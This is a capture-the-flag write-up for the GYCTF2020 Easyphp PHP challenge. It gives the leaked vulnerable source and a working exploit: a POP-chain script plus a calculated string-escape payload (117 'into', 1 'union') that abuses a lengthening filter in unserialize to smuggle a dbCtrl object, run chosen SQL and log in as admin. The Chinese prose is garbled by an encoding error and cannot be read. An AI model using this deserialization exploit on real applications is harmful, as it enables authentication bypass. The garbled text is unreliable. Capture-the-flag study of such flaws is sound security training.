é¢ç®æ³è¿ð<a href="https://buuoj.cn/challenges#[GYCTF2020]Easyphp">[GYCTF2020]Easyphp</a>

å¾å·§å¦çä¸éé¢

`www.zip`æºç æ³é²ï¼ä¸»è¦çé»è¾å¨`lib.php`ä¸­

```php
<?php
error_reporting(0);
session_start();
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
class User
{
    public $id;
    public $age=null;
    public $nickname=null;
    public function login() {
        if(isset($_POST['username'])&&isset($_POST['password'])){
        $mysqli=new dbCtrl();
        $this->id=$mysqli->login('select id,password from user where username=?');
        if($this->id){
        $_SESSION['id']=$this->id;
        $_SESSION['login']=1;
        echo "ä½ çIDæ¯".$_SESSION['id'];
        echo "ä½ å¥½ï¼".$_SESSION['token'];
        echo "<script>window.location.href='./update.php'</script>";
        return $this->id;
        }
    }
}
    public function update(){
        $Info=unserialize($this->getNewinfo());
        $age=$Info->age;
        $nickname=$Info->nickname;
        $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
        //è¿ä¸ªåè½è¿æ²¡æåå® åå å
    }
    public function getNewInfo(){
        $age=$_POST['age'];
        $nickname=$_POST['nickname'];
        return safe(serialize(new Info($age,$nickname)));
    }
    public function __destruct(){
        return file_get_contents($this->nickname);//å±
    }
    public function __toString()
    {
        $this->nickname->update($this->age);
        return "0-0";
    }
}
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this->age=$age;
        $this->nickname=$nickname;
    }
    public function __call($name,$argument){
        echo $this->CtrlCase->login($argument[0]);
    }
}
Class UpdateHelper{
    public $id;
    public $newinfo;
    public $sql;
    public function __construct($newInfo,$sql){
        $newInfo=unserialize($newInfo);
        $upDate=new dbCtrl();
    }
    public function __destruct()
    {
        echo $this->sql;
    }
}
class dbCtrl
{
    public $hostname="127.0.0.1";
    public $dbuser="root";
    public $dbpass="root";
    public $database="test";
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    {
        $this->name=$_POST['username'];
        $this->password=$_POST['password'];
        $this->token=$_SESSION['token'];
    }
    public function login($sql)
    {
        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
        if ($this->mysqli->connect_error) {
            die("è¿æ¥å¤±è´¥ï¼éè¯¯:" . $this->mysqli->connect_error);
        }
        $result=$this->mysqli->prepare($sql);
        $result->bind_param('s', $this->name);
        $result->execute();
        $result->bind_result($idResult, $passwordResult);
        $result->fetch();
        $result->close();
        if ($this->token=='admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('ç¨æ·ä¸å­å¨!');
            return false;
        }
        if (md5($this->password)!==$passwordResult) {
            echo('å¯ç éè¯¯ï¼');
            return false;
        }
        $_SESSION['token']=$this->name;
        return $idResult;
    }
}
```

```php
// update.php
if ($_SESSION['login']!=1){
	echo "ä½ è¿æ²¡æç»éå¢ï¼";
}
$users=new User();
$users->update();
if($_SESSION['login']===1){
	require_once("flag.php");
	echo $flag;
}
```

# èµ·

éç¨é¢ç¼è¯ï¼SQLæ³¨å¥æ¯ä¸è¡äº

æä»¬è½æ§å¶çç¹åªæåå¤ï¼

`User#login`ä¸­ç`$_POST['username']`ã`$_POST['password']`

`User#getNewInfo`ä¸­ç`$_POST['age']`ã`$_POST['nickname']`

`User#__destruct`ä¸­æææå½æ°`file_get_contents`ï¼ä½æ¯å®æ¯returnåºæ¥çï¼æ æ³åæ¾

å æ­¤åªè½æ³æ¹è®¾æ³è®©`$_SESSION['login']===1`ï¼ä¹å°±æ¯æåç»å½ã

# æ¿

`Info#__call`ä¸­æè°ç¨`login`ï¼å¯ä»¥ä»¥æ­¤ä¸ºå¥å£

åªéç¨å°äº`Info`ç±»ï¼  `User#update -> User#getNewInfo`

`$Info=unserialize(safe(serialize(new Info($age,$nickname))));`

åæé Infoå¯¹è±¡ï¼å¯¹å¶è¿è¡å®å¨çåºååï¼åè¿è¡ååºååï¼å¶ä¸­æé å¨çåæ°æä»¬å¯æ§

safeå½æ°è®©æä»¬è½å¤å®ç°å­ç¬¦ä¸²éé¸

`update`åè¿è¡äºååºååå¾å°å¯¹è±¡`$Info`ï¼ååº`$Info`çä¸¤ä¸ªå±æ§ageãnickname

æ¥çå¨`new UpdateHelper`çç¬¬ä¸ä¸ªåæ°ä¸­è¿è¡äºåéåå­ç¬¦ä¸²æ¼æ¥ï¼èè`User#__toString`ï¼æ§è¡äº`$this->nickname->update($this->age)`ï¼å¦æåè°ç¨`update`æ¹æ³å°±æ²¡ææäºï¼èè`Info#__call`ï¼æ§è¡äº`echo $this->CtrlCase->login($argument[0])`ï¼è®©`$this->CtrlCase`ä¸º`dbCtrl`å¯¹è±¡ï¼ä¸`token=='admin'`

# è½¬

å¥½å§ï¼ä¸é¢çæè·¯æ¯ä¼å µæ­»çããã

é¦åå¶å®æåè°ç¨`dbCtrl#login($sql)`çsqlè¯­å¥æä»¬æ¯å¯æ§çï¼éè¿`$this->age`ä¼ å¥ï¼ä¸é¢ç`__toString`ä½¿å¾`$this->age`åªè½å®æ­»ä¸º`Info`å¯¹è±¡ï¼ä¸è½ä¼ sqläºã
æ¢ç¶æ¥è¯¢çä¸è¥¿é½å¯æ§äºï¼å°±è½ç»è¿`md5($this->password)!==$passwordResult`çæ£æµ

æé SQLè¯­å¥`'select 1,md5(1) from user where username=?'`

æ§è¡å°`$_SESSION['token']=$this->name;`ï¼è¿æ ·çè¯ï¼ä¸æ¬¡ç»å½åªè¦è¾å¥ç¨æ·åä¸ºadminï¼å¯ç éä¾¿è¾ï¼loginçé»è¾åªè¦æ£æµå°`$_SESSION['token']=='admin'`å°±ç»å½æåäºã

`UpdateHelper#__destruct`è°ç¨äºechoï¼å¯ä»¥æè¿éå½æ`__toString`æ¥å£

ççPOPé¾ä¼æ¯è¾æ¸æ¥

```php
<?php
class User
{
    public $age = null;
    public $nickname = null;
    public function __construct()
    {
        $this->age = 'select 1,md5(1) from user where username=?';
        $this->nickname = new Info();
    }
}
class Info
{
    public $CtrlCase;
    public function __construct()
    {
        $this->CtrlCase = new dbCtrl();
    }
}
class UpdateHelper
{
    public $sql;
    public function __construct()
    {
        $this->sql = new User();
    }
}
class dbCtrl
{
    public $name = "admin";
    public $password = "1";
}
$o = new UpdateHelper;
echo serialize($o);
```

æ¥çæèå­ç¬¦ä¸²éé¸é®é¢

![image-20221019185115720](../images/image-20221019185115720.png)

æ¾ç¶æ¯å­ç¬¦ä¸²å¢å çæåµ

åè®¾æä»¬éè¿nicknameæ¥ä¼ å¥åºååå­ç¬¦ä¸²

æ¬å°æµè¯ä¸ä¸
```php
<?php
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this->age=$age;
        $this->nickname=$nickname;
    }
}
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
function getNewInfo(){
    $age=$_POST['age'];
    $nickname=$_POST['nickname'];
    echo safe(serialize(new Info($age,$nickname)));
}
if(isset($_POST['age'])&&isset($_POST['nickname']))
    getNewInfo();
```

![image-20221019190543108](../images/image-20221019190543108.png)

![image-20221019190648992](../images/image-20221019190648992.png)

è¥æ³æåååºååï¼éè¦å¨é»è²è§ååé¢å ä¸è¥¿ï¼è®©å¶é¿åº¦åå¥½æ»¡è¶³åé¢çåé¢çé¿åº¦ï¼åæè¿ä¸é¨åä½ä¸ºnicknameçå¼

è¿å¾é¢å¤å ä¸ä¸ªåºååå±æ§ï¼æ¥è¡¥åInfoçç¬¬ä¸ä¸ªæå`CtrlCase`

é»è²è§ååé¢åå ä¸ª`}`è¡¨ç¤ºåºååç»æ

é»è²è§åé¨åæ217ä¸ªå­ç¬¦

`";s:8:"CtrlCase";`æ17ä¸ªå­ç¬¦

`into`æ¢`hacker`å¤äº2ä¸ªå­ç¬¦ã`unionæ¢`hacker`å¤äº1ä¸ªå­ç¬¦`

åè®¾å¡«åäºxä¸ª`into`ï¼å `4x + 217 + 17 + 1 = 6x`ï¼è§£å¾x=117ä½1

æä»¥éè¦å¡«å117ä¸ª`into`ã1ä¸ª`union`

![image-20221019193456139](../images/image-20221019193456139.png)

æ¿çè¿ä¸ªè¯·æ±ä½å»è®¿é®/update.phpï¼æ­¤æ¶SESSION['token']=admin

æ¥çè®¿é®/login.php  ç¨æ·è¾aminãå¯ç éä¾¿ï¼ç»å½å¾å°flag